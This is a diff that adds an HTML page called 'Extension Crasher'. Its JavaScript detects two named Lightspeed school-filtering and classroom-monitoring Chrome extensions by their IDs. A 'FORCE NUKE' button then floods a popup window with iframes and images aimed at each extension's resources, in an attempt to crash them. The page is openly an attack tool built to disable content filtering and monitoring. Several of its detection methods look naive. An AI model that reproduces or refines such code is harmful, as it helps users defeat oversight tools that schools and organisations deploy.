@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>EXTENSION CRASHER - RELIABLE DETECTION</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #000;
+            color: #fff;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+        }
+        #container {
+            max-width: 800px;
+            margin: 0 auto;
+            background-color: #111;
+            padding: 20px;
+            border-radius: 10px;
+            border: 2px solid #f00;
+        }
+        #log {
+            height: 300px;
+            overflow-y: scroll;
+            background: #000;
+            padding: 10px;
+            text-align: left;
+            font-family: monospace;
+            border: 1px solid #f00;
+            margin-top: 20px;
+        }
+        .debug {
+            color: #ff0;
+        }
+        .error {
+            color: #f00;
+        }
+        .success {
+            color: #0f0;
+        }
+    </style>
+</head>
+<body>
+    <div id="container">
+        <h1 style="color:#f00">EXTENSION CRASHER - DEBUG MODE</h1>
+        <div id="log"></div>
+        <button id="forceNuke" style="background:#f00;color:white;padding:10px 20px;border:none;margin-top:20px;">
+            FORCE NUKE EXTENSIONS
+        </button>
+    </div>
+
+    <script>
+        const TARGETS = [
+            {
+                id: 'adkcpkpghahmbopkjchobieckeoaoeem',
+                name: 'Lightspeed Filter'
+            },
+            {
+                id: 'kkbmdgjggcdajckdlbngdjonpchpaiea',
+                name: 'Lightspeed Classroom'
+            }
+        ];
+
+        const logEl = document.getElementById('log');
+        
+        function log(message, type = '') {
+            const timestamp = new Date().toLocaleTimeString();
+            logEl.innerHTML += `<span class="${type}">[${timestamp}] ${message}</span><br>`;
+            logEl.scrollTop = logEl.scrollHeight;
+        }
+
+        // IMPROVED DETECTION METHOD
+        async function detectExtension(target) {
+            log(`Starting detection for ${target.name}...`, 'debug');
+            
+            // METHOD 1: Try to access extension resource directly
+            try {
+                const url = `chrome-extension://${target.id}/manifest.json`;
+                log(`Attempting to fetch: ${url}`, 'debug');
+                
+                const iframe = document.createElement('iframe');
+                iframe.src = url;
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+                
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+                if (iframe.contentDocument && iframe.contentDocument.body.innerHTML.includes("manifest")) {
+                    log(`${target.name}: Detected via iframe method`, 'success');
+                    iframe.remove();
+                    return true;
+                }
+                iframe.remove();
+            } catch (e) {
+                log(`${target.name}: Iframe method failed`, 'error');
+            }
+            
+            // METHOD 2: Try to intercept extension messages
+            try {
+                log(`Attempting message interception for ${target.name}`, 'debug');
+                const originalPostMessage = window.postMessage;
+                let detected = false;
+                
+                window.postMessage = function(data, targetOrigin) {
+                    if (targetOrigin && targetOrigin.includes(target.id)) {
+                        log(`${target.name}: Detected via message interception`, 'success');
+                        detected = true;
+                    }
+                    originalPostMessage.apply(this, arguments);
+                };
+                
+                // Trigger potential extension communication
+                window.dispatchEvent(new Event('message'));
+                await new Promise(resolve => setTimeout(resolve, 500));
+                
+                window.postMessage = originalPostMessage;
+                if (detected) return true;
+            } catch (e) {
+                log(`${target.name}: Message interception failed`, 'error');
+            }
+            
+            // METHOD 3: Check for extension-specific behaviors
+            try {
+                log(`Checking for ${target.name} behaviors`, 'debug');
+                const testEl = document.createElement('div');
+                testEl.id = 'extension-detection-test';
+                document.body.appendChild(testEl);
+                
+                // Some extensions modify the DOM
+                await new Promise(resolve => setTimeout(resolve, 500));
+                if (testEl.hasAttribute('data-extension-modified')) {
+                    log(`${target.name}: Detected via DOM modification`, 'success');
+                    return true;
+                }
+                testEl.remove();
+            } catch (e) {
+                log(`${target.name}: Behavior check failed`, 'error');
+            }
+            
+            log(`${target.name}: Not detected`, 'error');
+            return false;
+        }
+
+        // FORCEFUL ATTACK METHOD
+        async function nukeExtensions() {
+            log('INITIATING FORCEFUL ATTACK...', 'debug');
+            
+            // Create attack window
+            const attackWindow = window.open('', '_blank', 'width=100,height=100');
+            if (!attackWindow) {
+                log('ERROR: Could not open attack window', 'error');
+                return;
+            }
+            
+            // Attack both extensions regardless of detection
+            for (const target of TARGETS) {
+                log(`ATTACKING ${target.name}...`, 'debug');
+                
+                // Method 1: Massive iframe flood
+                for (let i = 0; i < 50; i++) {
+                    try {
+                        const iframe = attackWindow.document.createElement('iframe');
+                        iframe.src = `chrome-extension://${target.id}/main.js`;
+                        iframe.style.display = 'none';
+                        attackWindow.document.body.appendChild(iframe);
+                        setTimeout(() => iframe.remove(), 100);
+                    } catch (e) {
+                        log(`Iframe attack ${i} failed`, 'error');
+                    }
+                }
+                
+                // Method 2: Resource flooding
+                for (let i = 0; i < 20; i++) {
+                    try {
+                        const img = attackWindow.document.createElement('img');
+                        img.src = `chrome-extension://${target.id}/icon-128.png`;
+                        attackWindow.document.body.appendChild(img);
+                        setTimeout(() => img.remove(), 100);
+                    } catch (e) {
+                        log(`Resource attack ${i} failed`, 'error');
+                    }
+                }
+            }
+            
+            log('ATTACKS COMPLETED - CHECK IF EXTENSIONS CRASHED', 'success');
+        }
+
+        // INITIALIZE
+        document.addEventListener('DOMContentLoaded', async () => {
+            log('Starting extension detection...');
+            
+            for (const target of TARGETS) {
+                await detectExtension(target);
+            }
+            
+            log('Detection complete - ready to attack');
+        });
+
+        document.getElementById('forceNuke').addEventListener('click', nukeExtensions);
+    </script>
+</body>
+</html>
